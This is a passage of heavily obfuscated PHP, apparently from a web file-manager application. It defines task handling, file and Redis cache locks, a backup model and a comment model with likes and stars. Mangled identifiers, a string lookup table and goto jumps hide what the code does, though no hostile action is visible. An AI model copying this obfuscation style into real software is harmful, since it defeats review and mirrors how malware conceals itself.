$_SERVER[¬ÏÕ§Áú]; $°Î¬Ğœ = self::listData(); foreach ($°Î¬Ğœ as $Û¡ú—Şó) { self::kill($Û¡ú—Şó[$”ˆµëë¹[492]]); } sleep(2); foreach ($°Î¬Ğœ as $Û¡ú—Şó) { self::valueSet($Û¡ú—Şó[$”ˆµëë¹[492]], !1); } } private static function changeStatus($¾äè›Ô³, $ËÓÌ˜ß™) { $óí¹¼Â  =& $_SERVER[¬ÏÕ§Áú]; $†ÇõùÇ† = self::valueGet($¾äè›Ô³); if (!$†ÇõùÇ†) { return !1; } $†ÇõùÇ†[$óí¹¼Â [863]] = $ËÓÌ˜ß™; self::valueSet($¾äè›Ô³, $†ÇõùÇ†); self::log($óí¹¼Â [1863] . $†ÇõùÇ†[$óí¹¼Â [492]] . $óí¹¼Â [1864] . $ËÓÌ˜ß™); return !0; } public static function valueGet($úİµ¸óÓ = false) { $•¿€”˜æ =& $_SERVER[¬ÏÕ§Áú]; if ($úİµ¸óÓ) { $Ãúè¼¤ = Model($•¿€”˜æ[539])->where(array($•¿€”˜æ[107] => $úİµ¸óÓ, $•¿€”˜æ[33] => $•¿€”˜æ[1197]))->find(); return $Ãúè¼¤ ? json_decode($Ãúè¼¤[$•¿€”˜æ[461]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($ËïĞ´ù¿ = false) { $ïÅòÜÈ® =& $_SERVER[¬ÏÕ§Áú]; $ªÌÖú¶ = array($ïÅòÜÈ®[33] => $ïÅòÜÈ®[1197]); if ($ËïĞ´ù¿) { $ªÌÖú¶[$ïÅòÜÈ®[1837]] = $ËïĞ´ù¿; } $Ú˜È¤¾Ì = Model($ïÅòÜÈ®[539])->where($ªÌÖú¶)->select(); $Ú˜È¤¾Ì = $Ú˜È¤¾Ì ? $Ú˜È¤¾Ì : array(); foreach ($Ú˜È¤¾Ì as $²ƒï£ÌÙ => $ü«ËïÕƒ) { $Ú˜È¤¾Ì[$²ƒï£ÌÙ] = json_decode($ü«ËïÕƒ[$ïÅòÜÈ®[461]], !0); } return $Ú˜È¤¾Ì; } public static function valueSet($‹ç†§—, $¢‘‘×¤º) { $şßŞ÷» =& $_SERVER[¬ÏÕ§Áú]; if (!$¢‘‘×¤º) { return Model($şßŞ÷»[539])->where(array($şßŞ÷»[107] => $‹ç†§—, $şßŞ÷»[33] => $şßŞ÷»[1197]))->delete(); } $Äœú½ = json_encode($¢‘‘×¤º); if (!$Äœú½) { ob_start(); var_dump($¢‘‘×¤º); $ï‡Ş°»è = ob_get_clean(); self::log($şßŞ÷»[1865] . json_encode_force($ï‡Ş°»è)); } if (!$‹ç†§— || !$¢‘‘×¤º[$şßŞ÷»[492]]) { return !1; } $’Ì½˜Ñç = array($şßŞ÷»[33] => $şßŞ÷»[1197], $şßŞ÷»[1837] => USER_ID, $şßŞ÷»[107] => $‹ç†§—, $şßŞ÷»[461] => $Äœú½); $û•ã¸æÒ = $şßŞ÷»[1866]; CacheLock::lock($û•ã¸æÒ); Model($şßŞ÷»[539])->add($’Ì½˜Ñç, array(), !0); CacheLock::unlock($û•ã¸æÒ); } public static function log($ıËü·°Š) { if (!GLOBAL_DEBUG) { return; } write_log($ıËü·°Š, $_SERVER[¬ÏÕ§Áú][1867]); } } goto A™ˆ…§Ÿˆ§; CŞÚ¡¯º©: function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $á¤£ù§À =& $_SERVER[¬ÏÕ§Áú]; $ßøåÙ€ = $GLOBALS[$á¤£ù§À[6]][$á¤£ù§À[435]]; self::$cachePath = $ßøåÙ€[$á¤£ù§À[243]][$á¤£ù§À[97]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($çªÉ²²™, $€½å¼Ô© = 0) { $±ë‡ıŠ =& $_SERVER[¬ÏÕ§Áú]; $æ¼ÇŠ¼˜ = microtime(!0); $Îë úª = $æ¼ÇŠ¼˜ + $€½å¼Ô© + 0.0001; $¸Ò·€š = rtrim(self::$cachePath, $±ë‡ıŠ[8]) . $±ë‡ıŠ[989] . md5($çªÉ²²™) . $±ë‡ıŠ[986]; if (file_exists($¸Ò·€š) && filemtime($¸Ò·€š) && filemtime($¸Ò·€š) < time() - 10) { @unlink($¸Ò·€š); } do { if (file_exists($¸Ò·€š)) { cacheLockWait(); continue; } $áååá›… = fopen($¸Ò·€š, $±ë‡ıŠ[990]); if (!$áååá›…) { return !1; } $ÍàÂœ = flock($áååá›…, LOCK_EX | LOCK_NB); self::$caches[$çªÉ²²™] = array($±ë‡ıŠ[991] => $áååá›…, $±ë‡ıŠ[243] => $¸Ò·€š); fwrite($áååá›…, $Îë úª); clearstatcache(); if ($áååá›… && $ÍàÂœ) { return !0; } cacheLockWait(); } while (microtime(!0) < $Îë úª); $this->unlock($çªÉ²²™); return !1; } public function lockGet($«Åä‡öŞ) { $„üí¾Š =& $_SERVER[¬ÏÕ§Áú]; $éÖí«œ» = rtrim(self::$cachePath, $„üí¾Š[8]) . $„üí¾Š[989] . md5($«Åä‡öŞ) . $„üí¾Š[986]; return file_exists($éÖí«œ»); } public function unlock($šÀ¸§ß€) { $¢Õë²ù÷ =& $_SERVER[¬ÏÕ§Áú]; $òæ¸ğŠğ = self::$caches[$šÀ¸§ß€]; if (!$òæ¸ğŠğ) { return; } @flock($òæ¸ğŠğ[$¢Õë²ù÷[991]], LOCK_UN); @fclose($òæ¸ğŠğ[$¢Õë²ù÷[991]]); @unlink($òæ¸ğŠğ[$¢Õë²ù÷[243]]); unset(self::$caches[$šÀ¸§ß€]); } } class CacheLockRedis { public function lock($óÛªµä”, $ˆÏÛÄø‡ = 10) { $¨Ñ±ÑÃô = Cache::init(); $÷•²ãŸ = microtime(!0) + $ˆÏÛÄø‡; while (microtime(!0) < $÷•²ãŸ) { $Ö¾Øˆ» = $¨Ñ±ÑÃô->get($óÛªµä”); if (!$Ö¾Øˆ») { $á…’Ğœ = $¨Ñ±ÑÃô->setLock($óÛªµä”, $÷•²ãŸ, $ˆÏÛÄø‡); if ($á…’Ğœ) { return !0; } } else { if ($Ö¾Øˆ» < microtime(!0)) { $¨Ñ±ÑÃô->set($óÛªµä”, $÷•²ãŸ, $ˆÏÛÄø‡ * 2); if ($¨Ñ±ÑÃô->get($óÛªµä”) === $Ö¾Øˆ») { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($ÚóÊÆ˜­) { return Cache::init()->get($ÚóÊÆ˜­); } public function unlock($¯ú­úÄ) { return Cache::init()->remove($¯ú­úÄ); } } goto E¨Õ…ï½À; C¿ŸÇÎÊ•§: class BackupModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\x65\x6d\56\x62\141\x63\153\165\x70\x4c\151\163\164"; public $field = array("\151\x6f", "\156\141\x6d\x65", "\163\x74\x61\164\x75\x73", "\x63\157\156\164\x65\x6e\x74", "\x6d\x61\156\x75\x61\x6c", "\162\x65\163\x75\154\164", "\x74\x69\x6d\x65\106\x72\157\155", "\x74\151\155\145\x54\157"); public function config() { $‹ˆŸ³èÇ =& $_SERVER[¬ÏÕ§Áú]; Action($‹ˆŸ³èÇ[2062])->taskInit(); $”üĞ„Àù = Model($‹ˆŸ³èÇ[886])->get($‹ˆŸ³èÇ[893]); $”üĞ„Àù = json_decode($”üĞ„Àù, !0); $”üĞ„Àù = is_array($”üĞ„Àù) ? $”üĞ„Àù : array(); $this->parseContent($”üĞ„Àù); unset($”üĞ„Àù[$‹ˆŸ³èÇ[1806]]); Model($‹ˆŸ³èÇ[1805])->cacheClear(); $¸šÜõ  = $‹ˆŸ³èÇ[2063]; $÷áÛ¨¼ƒ = Model($‹ˆŸ³èÇ[2064])->findByKey($‹ˆŸ³èÇ[1824], $¸šÜõ ); if (!$÷áÛ¨¼ƒ) { $÷áÛ¨¼ƒ = array(); } if (isset($÷áÛ¨¼ƒ[$‹ˆŸ³èÇ[217]])) { $÷áÛ¨¼ƒ[$‹ˆŸ³èÇ[217]] = json_decode($÷áÛ¨¼ƒ[$‹ˆŸ³èÇ[217]], !0); } if (isset($”üĞ„Àù[$‹ˆŸ³èÇ[217]])) { $÷áÛ¨¼ƒ[$‹ˆŸ³èÇ[217]][$‹ˆŸ³èÇ[1809]] = $”üĞ„Àù[$‹ˆŸ³èÇ[217]]; unset($”üĞ„Àù[$‹ˆŸ³èÇ[217]]); } return array_merge($÷áÛ¨¼ƒ, $”üĞ„Àù); } public function listData($”Ç¢ôÊ¤ = false, $Ô†…ºŒ = "\155\157\x64\x69\x66\171\x54\x69\155\x65", $‚û¼ºè = false) { $úé§Š›Õ = parent::listData($”Ç¢ôÊ¤, $Ô†…ºŒ, !0); if (!$úé§Š›Õ) { return $úé§Š›Õ; } if ($”Ç¢ôÊ¤) { $úé§Š›Õ = array($úé§Š›Õ); } foreach ($úé§Š›Õ as &$ëÉŠºÓè) { $this->parseContent($ëÉŠºÓè); } return $”Ç¢ôÊ¤ ? $úé§Š›Õ[0] : $úé§Š›Õ; } public function parseContent(&$¹’Ãœ¤á) { $ò”Ú‹À¹ =& $_SERVER[¬ÏÕ§Áú]; $ªĞ¶Î—Æ = _get($¹’Ãœ¤á, $ò”Ú‹À¹[181], $ò”Ú‹À¹[101]); if (!in_array($ªĞ¶Î—Æ, array($ò”Ú‹À¹[892], $ò”Ú‹À¹[1264]))) { $¹’Ãœ¤á[$ò”Ú‹À¹[181]] = $ªĞ¶Î—Æ == $ò”Ú‹À¹[101] ? $ò”Ú‹À¹[1264] : $ò”Ú‹À¹[892]; } } public function lastItem() { $ªâ÷¢í› = $this->listData(); return !empty($ªâ÷¢í›[0]) ? $ªâ÷¢í›[0] : null; } public function kill($ìåİ¬éĞ) { $¨²àºëæ =& $_SERVER[¬ÏÕ§Áú]; $İ´ƒ‘İ´ = $this->listData($ìåİ¬éĞ); if (!$İ´ƒ‘İ´ || empty($İ´ƒ‘İ´[$¨²àºëæ[32]])) { return !0; } Task::kill($¨²àºëæ[901]); Task::kill($¨²àºëæ[920]); Task::kill($¨²àºëæ[930]); $³½‰˜Šº = $İ´ƒ‘İ´[$¨²àºëæ[32]]; $™•ğ ç = TEMP_FILES . $¨²àºëæ[896] . $³½‰˜Šº . $¨²àºëæ[8]; IO::remove($™•ğ ç, !1); return $this->remove($ìåİ¬éĞ); } public function remove($‰ãÅïÍ) { $ÛÕÔ÷Å¦ = $this->listData($‰ãÅïÍ); if (!$ÛÕÔ÷Å¦) { return !0; } return $this->backupRemove($ÛÕÔ÷Å¦); } private function backupRemove($¤’ÖŒ¿Ú) { parent::remove($¤’ÖŒ¿Ú[$_SERVER[¬ÏÕ§Áú][492]]); $…·¢á±“ = $this->backupPath($¤’ÖŒ¿Ú); IO::remove($…·¢á±“, !1); return !0; } private function backupPath($ó¶×Óøá) { $Ï¯âë•“ =& $_SERVER[¬ÏÕ§Áú]; $Ã¢Õäµæ = $ó¶×Óøá[$Ï¯âë•“[32]]; $½¤œ©° = Model($Ï¯âë•“[886])->get($Ï¯âë•“[887]); $±¸·×í = substr(md5($Ï¯âë•“[888] . $½¤œ©° . $Ã¢Õäµæ), 0, 8); return "\x7b\x69\157\x3a{$ó¶×Óøá[$Ï¯âë•“[865]]}\x7d\57\144\141\164\141\x62\141\163\x65\x2f\x62\x61\x63\x6b\x75\160\57" . $Ã¢Õäµæ . $Ï¯âë•“[11] . $±¸·×í; } public function start() { $¼ûÎÙãÎ =& $_SERVER[¬ÏÕ§Áú]; if ($GLOBALS[$¼ûÎÙãÎ[6]][$¼ûÎÙãÎ[102]][$¼ûÎÙãÎ[2065]] != $¼ûÎÙãÎ[101]) { return !0; } $‘¿×€×è = $this->config(); if (!$‘¿×€×è || $‘¿×€×è[$¼ûÎÙãÎ[1806]] != $¼ûÎÙãÎ[101]) { return !1; } if ($‘¿×€×è[$¼ûÎÙãÎ[181]] == $¼ûÎÙãÎ[892]) { $€¿ÙÑ—ú = Model($¼ûÎÙãÎ[886])->get($¼ûÎÙãÎ[1379]); if ($€¿ÙÑ—ú == $¼ûÎÙãÎ[1380]) { $‘¿×€×è[$¼ûÎÙãÎ[181]] = $¼ûÎÙãÎ[1264]; } } $ü³¹ä®Õ = $this->process(); foreach ($ü³¹ä®Õ as $¤“‚»õÖ) { if ($¤“‚»õÖ) { return Task::restart($¤“‚»õÖ[$¼ûÎÙãÎ[492]]); } } $øøÂˆİ´ = new Backup(); $ç‹Îüş§ = $øøÂˆİ´->db(); if ($ç‹Îüş§) { $ç‹Îüş§ = $øøÂˆİ´->dbFile(); if ($ç‹Îüş§ && $‘¿×€×è[$¼ûÎÙãÎ[181]] == $¼ûÎÙãÎ[892]) { $ç‹Îüş§ = $øøÂˆİ´->file(); } } Backup::set(array($¼ûÎÙãÎ[863] => 1, $¼ûÎÙãÎ[875] => time())); return !0; } public function process() { $„¯É÷€ =& $_SERVER[¬ÏÕ§Áú]; $·¶ê‡ı‡ = array($„¯É÷€[871] => Task::get($„¯É÷€[901]), $„¯É÷€[876] => Task::get($„¯É÷€[920]), $„¯É÷€[243] => Task::get($„¯É÷€[930])); $òşŸ”›Ó = !1; foreach ($·¶ê‡ı‡ as &$‚‚å¹µü) { if ($òşŸ”›Ó) { $‚‚å¹µü = !1; continue; } if ($‚‚å¹µü) { $öÚ»”™£ = intval(_get($‚‚å¹µü, $„¯É÷€[1842], 0)); if (time() - $öÚ»”™£ > 7200) { Task::kill($‚‚å¹µü[$„¯É÷€[492]]); $òşŸ”›Ó = !0; $‚‚å¹µü = !1; } } } return $·¶ê‡ı‡; } public function restore() { $–ó˜í• =& $_SERVER[¬ÏÕ§Áú]; ActionCall($–ó˜í•[1185], !0, 1); ActionCall($–ó˜í•[1185], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\143\157\x6d\x6d\145\x6e\x74"; protected $tableMeta = array("\x74\x61\x62\x6c\145\116\141\x6d\145" => "\143\157\x6d\155\145\x6e\164\137\x6d\x65\x74\141", "\155\145\x74\141\106\x69\145\x6c\144" => "\x63\157\155\155\x65\156\164\111\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($ô­ÙÚ­¿) { $ñî˜ÓÂ¹ =& $_SERVER[¬ÏÕ§Áú]; if ($ô­ÙÚ­¿[$ñî˜ÓÂ¹[2066]]) { $ıºùÈ’ = $this->where(array($ñî˜ÓÂ¹[2067] => $ô­ÙÚ­¿[$ñî˜ÓÂ¹[2066]]))->find(); if (!$ıºùÈ’ || $ıºùÈ’[$ñî˜ÓÂ¹[201]] != $ô­ÙÚ­¿[$ñî˜ÓÂ¹[201]] || $ıºùÈ’[$ñî˜ÓÂ¹[590]] != $ô­ÙÚ­¿[$ñî˜ÓÂ¹[590]]) { return !1; } $this->where(array($ñî˜ÓÂ¹[2067] => $ô­ÙÚ­¿[$ñî˜ÓÂ¹[2066]]))->setAdd($ñî˜ÓÂ¹[2068], 1); } $ô­ÙÚ­¿[$ñî˜ÓÂ¹[2069]] = 0; $ô­ÙÚ­¿[$ñî˜ÓÂ¹[2068]] = 0; $ô­ÙÚ­¿[$ñî˜ÓÂ¹[863]] = 1; return $this->add($ô­ÙÚ­¿); } public function commentCount($äÊşû•, $œ ÙÅö, $àÏ‡šÂ× = false) { $ô”¡òÆ =& $_SERVER[¬ÏÕ§Áú]; if (!$äÊşû•) { return array(); } if (is_string($äÊşû•) || is_int($äÊşû•)) { $äÊşû• = array($äÊşû•); } $·ÖÒœ”ƒ = array($ô”¡òÆ[590], $ô”¡òÆ[2070] => $ô”¡òÆ[586]); $®ŠÌéÈù = array($ô”¡òÆ[590] => array($ô”¡òÆ[7], $äÊşû•), $ô”¡òÆ[201] => $œ ÙÅö); if ($àÏ‡šÂ×) { $®ŠÌéÈù[$ô”¡òÆ[1837]] = $àÏ‡šÂ×; } $ÇÚÒşş½ = $this->field($·ÖÒœ”ƒ)->where($®ŠÌéÈù)->group($ô”¡òÆ[590])->select(); return array_to_keyvalue($ÇÚÒşş½, $ô”¡òÆ[590], $ô”¡òÆ[586]); } public function starTarget($¿ßÉ…·Ë, $÷ øº®ø) { $õœ€„ùÜ =& $_SERVER[¬ÏÕ§Áú]; $ºÖ¥¸´ = $¿ßÉ…·Ë + self::TYPE_STAR_OFFSET; $ÎÁ­ìó = array($õœ€„ùÜ[1837] => USER_ID, $õœ€„ùÜ[201] => $ºÖ¥¸´, $õœ€„ùÜ[590] => $÷ øº®ø); $úÄ±§íĞ = $this->where($ÎÁ­ìó)->find(); if ($úÄ±§íĞ) { return $this->where(array($õœ€„ùÜ[492] => $úÄ±§íĞ[$õœ€„ùÜ[492]]))->delete(); } $Ûá†Ü¦ö = array($õœ€„ùÜ[2066] => 0, $õœ€„ùÜ[1837] => USER_ID, $õœ€„ùÜ[863] => 1, $õœ€„ùÜ[181] => $õœ€„ùÜ[12], $õœ€„ùÜ[201] => $ºÖ¥¸´, $õœ€„ùÜ[590] => $÷ øº®ø, $õœ€„ùÜ[2069] => 0, $õœ€„ùÜ[2068] => 0); return $this->add($Ûá†Ü¦ö); } public function starTargetCount($âÍ Æí, $ñ¯„Õƒ‘) { $¶å˜‘‚Ü =& $_SERVER[¬ÏÕ§Áú]; $»Ç×“™ù = $ñ¯„Õƒ‘ + self::TYPE_STAR_OFFSET; $‹Ì¹¬ˆ­ = $this->commentCount($âÍ Æí, $»Ç×“™ù); $¾É¯µÖ¶ = $this->commentCount($âÍ Æí, $»Ç×“™ù, USER_ID); return array($¶å˜‘‚Ü[2071] => $‹Ì¹¬ˆ­, $¶å˜‘‚Ü[2072] => $¾É¯µÖ¶); } public function starTargetUserList($‘­æˆÀ, $ûªçÅ´¾) { $‡Ä»¨ß„ =& $_SERVER[¬ÏÕ§Áú]; $Áô«·ñÛ = $‘­æˆÀ + self::TYPE_STAR_OFFSET; $ù–™ÇÎ = array($‡Ä»¨ß„[590] => $ûªçÅ´¾, $‡Ä»¨ß„[201] => $Áô«·ñÛ); $İÌÏ“Ğ = $this->where($ù–™ÇÎ)->count(); $ƒÊÑû”‘ = array($‡Ä»¨ß„[344] => $İÌÏ“Ğ, $‡Ä»¨ß„[2073] => array()); if (!$İÌÏ“Ğ) { return $ƒÊÑû”‘; } $ğÀÃóş  = $this->field($‡Ä»¨ß„[1837])->where($ù–™ÇÎ)->limit(500)->select(); $ğÀÃóş  = array_to_keyvalue($ğÀÃóş , $‡Ä»¨ß„[12], $‡Ä»¨ß„[1837]); $ƒÊÑû”‘[$‡Ä»¨ß„[2073]] = Model($‡Ä»¨ß„[598])->userListInfo($ğÀÃóş ); return $ƒÊÑû”‘; } public function prasiseUserList($ ò¾ƒÂÛ) { $‘ÔƒµÃ‹ =& $_SERVER[¬ÏÕ§Áú]; $íöÜ’…î = array($‘ÔƒµÃ‹[2074] => $ ò¾ƒÂÛ); $Ù÷ı†Ùş = $this->where($íöÜ’…î)->find(); $ÂÄÙóòæ = _get($Ù÷ı†Ùş, $‘ÔƒµÃ‹[2069], 0); $ºõ×Ê½§ = array($‘ÔƒµÃ‹[344] => $ÂÄÙóòæ, $‘ÔƒµÃ‹[2073] => array()); if (!$ÂÄÙóòæ) { return $ºõ×Ê½§; } $ñğñ¾´ = Model($‘ÔƒµÃ‹[2075])->field($‘ÔƒµÃ‹[1837])->where($íöÜ’…î)->limit(500)->select(); $ñğñ¾´ = array_to_keyvalue($ñğñ¾´, $‘ÔƒµÃ‹[12], $‘ÔƒµÃ‹[1837]); $ºõ×Ê½§[$‘ÔƒµÃ‹[2073]] = Model($‘ÔƒµÃ‹[598])->userListInfo($ñğñ¾´); return $ºõ×Ê½§; } public function remove($™òø‰‘Ÿ) { $¢¹­¿ç› =& $_SERVER[¬ÏÕ§Áú]; $£ƒØ´µ’ = array($¢¹­¿ç›[2067] => $™òø‰‘Ÿ); $’ø¿Éá = $this->where($£ƒØ´µ’)->find(); if ($’ø¿Éá[$¢¹­¿ç›[2066]]) { $this->where(array($¢¹­¿ç›[2067] => $’ø¿Éá[$¢¹­¿ç›[2066]]))->setAdd($¢¹­¿ç›[2068], -1); } return $this->removeArray($™òø‰‘Ÿ); } public function edit($Îå•è, $Ö•ø¸) { $Œã¯‚×ª =& $_SERVER[¬ÏÕ§Áú]; $Ğ…Ü«í™ = array($Œã¯‚×ª[2067] => $Îå•è); return $this->where($Ğ…Ü«í™)->save(array($Œã¯‚×ª[2076] => $Ö•ø¸)); } public function prasise($ùœË) { $ÚŒÕ’„ =& $_SERVER[¬ÏÕ§Áú]; $è‚Æş¯´ = Model($ÚŒÕ’„[2077]); $á´£‹° = array($ÚŒÕ’„[2067] => $ùœË, $ÚŒÕ’„[1828] => USER_ID); $ÙÂËÃº = $è‚Æş¯´->where($á´£‹°)->find(); if (!$ÙÂËÃº) { $è‚Æş¯´->add($á´£‹°); $©çæì¥â = $this->where(array($ÚŒÕ’„[2067] => $ùœË))->setAdd($ÚŒÕ’„[2069], 1); } else { $è‚Æş¯´->where($á´£‹°)->delete(); $©çæì¥â = $this->where(array($ÚŒÕ’„[2067] => $ùœË))->setAdd($ÚŒÕ’„[2069], -1); } return $©çæì¥â; } public function targetInfo($ıïÇïå“, $êßå›ºÌ) { $¦ğá€×š =& $_SERVER[¬ÏÕ§Áú]; $«Ä¿Å• = array($¦ğá€×š[672] => $ıïÇïå“, $¦ğá€×š[673] => $êßå›ºÌ); $¥Ì«Úà¿ = $this->where($«Ä¿Å•)->count(); $ÂÛİ÷Ö = "\122\x49\x47\x48\124\40\x4a\x4f\x49\x4e\40{$this->tablePrefix}\x63\157\155\155\x65\x6e\x74\x5f\x70\x72\141\x69\x73\x65\40\x73\164\x61\x72\40\x6f\x6e\40\143\x6f\155\x6d\x65\x6e\164\56\143\x6f\x6d\x6d\x65\x6e\x74\x49\x44\x20\x3d\40\163\164\141\x72\x2e\143\157\155\155\x65\x6e\164\x49\104"; $¾÷æú = $this->alias($¦ğá€×š[440])->where($«Ä¿Å•)->join($ÂÛİ÷Ö, $¦ğá€×š[2078])->count(); $–‘¥¿éÈ = array($¦ğá€×š[2079] => $¥Ì«Úà¿, $¦ğá€×š[2080] => $¾÷æú); return $–‘¥¿éÈ; } public function listData($öóÛí¡Ú) { $ù¹ŸÉ´ =& $_SERVER[¬ÏÕ§Áú]; if (isset($öóÛí¡Ú[$ù¹ŸÉ´[2081]])) { if ($öóÛí¡Ú[$ù¹ŸÉ´[2081]]) { $öóÛí¡Ú[$ù¹ŸÉ´[2074]] = array($ù¹ŸÉ´[1139], intval($öóÛí¡Ú[$ù¹ŸÉ´[2081]])); } unset($öóÛí¡Ú[$ù¹ŸÉ´[2081]]); } if (isset($öóÛí¡Ú[$ù¹ŸÉ´[2082]])) { if ($öóÛí¡Ú[$ù¹ŸÉ´[2082]]) { $öóÛí¡Ú[$ù¹ŸÉ´[2074]] = array($ù¹ŸÉ´[1136], intval($öóÛí¡Ú[$ù¹ŸÉ´[2082]])); } unset($öóÛí¡Ú[$ù¹ŸÉ´[2082]]); } return $this->_listData($öóÛí¡Ú); } private function _listData($Å—¶„‹Ë) { $½šÄâöË =& $_SERVER[¬ÏÕ§Áú]; $ˆøÈìÛÊ = $this->where($Å—¶„‹Ë)->_makeOrder()->selectPage(100); $this->_listAppendParent($ˆøÈìÛÊ[$½šÄâöË[456]]); $this->_listAppendUser($ˆøÈìÛÊ[$½šÄâöË[456]]); $this->_listAppendMeta($ˆøÈìÛÊ[$½šÄâöË[456]]); return $ˆøÈìÛÊ; } private function _makeOrder() { $×ÇÃúé’ =& $_SERVER[¬ÏÕ§Áú]; $é¨Êùƒ‰ = array($×ÇÃúé’[2069], $×ÇÃúé’[2068], $×ÇÃúé’[244]); $•öÌèùó = Input::get($×ÇÃúé’[549], $×ÇÃúé’[7], $×ÇÃúé’[517], $é¨Êùƒ‰); $˜ÙÉÈñ = Input::get($×ÇÃúé’[550], $×ÇÃúé’[7], $×ÇÃúé’[1830], array($×ÇÃúé’[2083], $×ÇÃúé’[545])); $á™«¥Ûİ = $•öÌèùó . $×ÇÃúé’[53] . $˜ÙÉÈñ; return $this->order($á™«¥Ûİ); } private function _listAppendParent(&$ï«±«†å) { $¥Å±”Èã =& $_SERVER[¬ÏÕ§Áú]; $ùøõ¬±‰ = array_unique(array_to_keyvalue($ï«±«†å, $¥Å±”Èã[12], $¥Å±”Èã[2066])); $ùøõ¬±‰ = array_remove_value($ùøõ¬±‰, $¥Å±”Èã[241]); if (!$ùøõ¬±‰) { return; } $óÈÌ†ŞÄ = $this->where(array($¥Å±”Èã[2067] => array($¥Å±”Èã[7], $ùøõ¬±‰)))->select(); $óÈÌ†ŞÄ = array_to_keyvalue($óÈÌ†ŞÄ, $¥Å±”Èã[2074]); foreach ($ï«±«†å as &$Ùìùƒø) { if (isset($óÈÌ†ŞÄ[$Ùìùƒø[$¥Å±”Èã[2066]]])) { $Ùìùƒø[$¥Å±”Èã[2084]] = $óÈÌ†ŞÄ[$Ùìùƒø[$¥Å±”Èã[2066]]]; } } unset($Ùìùƒø); } private function _listAppendUser(&$Õû°õ¼â) { $ÎõÍÕÊå =& $_SERVER[¬ÏÕ§Áú]; $é›æ¶™ = array_unique(array_to_keyvalue($Õû°õ¼â, $ÎõÍÕÊå[12], $ÎõÍÕÊå[1837])); $é›æ¶™ = array_remove_value($é›æ¶™, $ÎõÍÕÊå[241]); if (count($é›æ¶™) == 0) { return; } foreach ($Õû°õ¼â as $×Ò…ÊàØ) { if (isset($×Ò…ÊàØ[$ÎõÍÕÊå[2084]])) { $é›æ¶™[] = $×Ò…ÊàØ[$ÎõÍÕÊå[2084]][$ÎõÍÕÊå[1837]]; } } $íİÓ§Î = Model($ÎõÍÕÊå[618])->userListInfo($é›æ¶™); foreach ($Õû°õ¼â as &$×Ò…ÊàØ) { $×Ò…ÊàØ[$ÎõÍÕÊå[686]] = $íİÓ§Î[$×Ò…ÊàØ[$ÎõÍÕÊå[1837]]]; if (isset($×Ò…ÊàØ[$ÎõÍÕÊå[2084]])) { $×Ò…ÊàØ[$ÎõÍÕÊå[2084]][$ÎõÍÕÊå[686]] = $íİÓ§Î[$×Ò…ÊàØ[$ÎõÍÕÊå[2084]][$ÎõÍÕÊå[1837]]]; } } unset($×Ò…ÊàØ); } private function _listAppendMeta(&$‡îá¼âü) { $ğìªíıÁ =& $_SERVER[¬ÏÕ§Áú]; $ÈÇœ­ = array_unique(array_to_keyvalue($‡îá¼âü, $ğìªíıÁ[12], $ğìªíıÁ[2074])); $ÈÇœ­ = array_remove_value($ÈÇœ­, $ğìªíıÁ[241]); if (!$ÈÇœ­) { return; } foreach ($‡îá¼âü as $ßÓœ‘â–) { if (isset($ßÓœ‘â–[$ğìªíıÁ[2084]])) { $ÈÇœ­[] = $ßÓœ‘â–[$ğìªíıÁ[2084]][$ğìªíıÁ[2074]]; } } $±“ŒÏë = $this->metaList($ÈÇœ­); if (!$±“ŒÏë) { return !1; } foreach ($‡îá¼âü as &$ßÓœ‘â–) { $ßÓœ‘â–[$ğìªíıÁ[560]] = $±“ŒÏë[$ßÓœ‘â–[$ğìªíıÁ[2074]]]; if (isset($ßÓœ‘â–[$ğìªíıÁ[2084]])) { $ßÓœ‘â–[$ğìªíıÁ[2084]][$ğìªíıÁ[560]] = $±“ŒÏë[$ßÓœ‘â–[$ğìªíıÁ[2084]][$ğìªíıÁ[2074]]]; } } unset($ßÓœ‘â–); } private function metaList($ŠÌÜÖ×ô) { $‹äë¼ƒ· =& $_SERVER[¬ÏÕ§Áú]; if (!$ŠÌÜÖ×ô) { return array(); } $ŞŸæ©˜‘ = array($‹äë¼ƒ·[2074] => array($‹äë¼ƒ·[7], $ŠÌÜÖ×ô)); $óÌÛÃƒ¤ = Model($‹äë¼ƒ·[2085])->where($ŞŸæ©˜‘)->select(); $óÌÛÃƒ¤ = array_to_keyvalue_group($óÌÛÃƒ¤, $‹äë¼ƒ·[2074]); foreach ($óÌÛÃƒ¤ as $îÍªÊô => $³îøêç›) { $×…İ•‚ = array(); foreach ($³îøêç› as $²§ß½Ö«) { $×…İ•‚[$²§ß½Ö«[$‹äë¼ƒ·[107]]] = $²§ß½Ö«[$‹äë¼ƒ·[461]]; } $óÌÛÃƒ¤[$îÍªÊô] = $×…İ•‚; } return $óÌÛÃƒ¤ ? $óÌÛÃƒ¤ : array(); } public function removeTarget($Ò˜¯‘¢, $Í›­ÜìŸ) { $…ŞœÃÎï =& $_SERVER[¬ÏÕ§Áú]; if (!$Í›­ÜìŸ) { return !0; } $Í›­ÜìŸ = is_array($Í›­ÜìŸ) ? $Í›­ÜìŸ : array($Í›­ÜìŸ); $”ã¤óä“ = array($…ŞœÃÎï[201] => $Ò˜¯‘¢, $…ŞœÃÎï[590] => array($…ŞœÃÎï[7], $Í›­ÜìŸ)); $ÍÂÊÓà£ = $this->field($…ŞœÃÎï[2074])->where($”ã¤óä“)->select(); $š”Ëá°Ä = array_to_keyvalue($ÍÂÊÓà£, $…ŞœÃÎï[12], $…ŞœÃÎï[2074]); return $this->removeArray($š”Ëá°Ä); } public function removeArray($¼éİ¨ˆ…) { $ñî‹ıÁ =& $_SERVER[¬ÏÕ§Áú]; if (!$¼éİ¨ˆ…) { return !0; } $¼éİ¨ˆ… = is_array($¼éİ¨ˆ…) ? $¼éİ¨ˆ… : array($¼éİ¨ˆ…); $ğğ ÅŠô = array($ñî‹ıÁ[2074] => array($ñî‹ıÁ[7], $¼éİ¨ˆ…)); Model($ñî‹ıÁ[2077])->where($ğğ ÅŠô)->delete(); 